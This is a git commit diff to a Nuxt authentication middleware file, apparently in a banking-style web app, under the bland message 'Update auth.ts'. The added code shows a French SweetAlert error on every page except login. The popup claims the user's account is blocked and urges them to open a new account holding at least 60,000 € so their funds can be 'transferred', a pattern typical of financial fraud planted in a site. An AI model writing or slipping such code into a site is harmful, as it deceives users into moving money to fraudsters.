7690fa49c46ca15b4212a1895e1c3610bd5060f7
donquidofi612 <168350352+donquidofi612@users.noreply.github.com>
2024-12-24 11:01:07 +0000

    Update auth.ts

--- middleware/auth.ts
+++ middleware/auth.ts
@@ -1,3 +1,6 @@
+import {useRoute} from "vue-router";
+import Swal from "sweetalert2";
+
 export default defineNuxtRouteMiddleware((to) => {
     const { authenticated } = storeToRefs(useAuthStore()); // make authenticated state reactive
     const token = useCookie('token'); // get token from cookies
@@ -5,6 +8,10 @@ export default defineNuxtRouteMiddleware((to) => {
       // check if value exists
       authenticated.value = true; // update the state to authenticated
     }
+
+    const route = useRoute()
+    if(route.path !== '/auth/login')
+        Swal.fire('Erreur', "Votre compte est bloqué. Veuillez ouvrir un autre compte afin que nous puissions y transférer vos fonds, assurez-vous d'avoir au moins 60 000 € sur le compte. Pour toute information supplémentaire, merci de vous adresser à votre conseiller.", 'error');
   
     // if token exists and url is /login redirect to homepage
     if (token.value && to?.name === 'auth-login') {
@@ -16,4 +23,3 @@ export default defineNuxtRouteMiddleware((to) => {
         return navigateTo('/auth/login');
     }
   });
-  
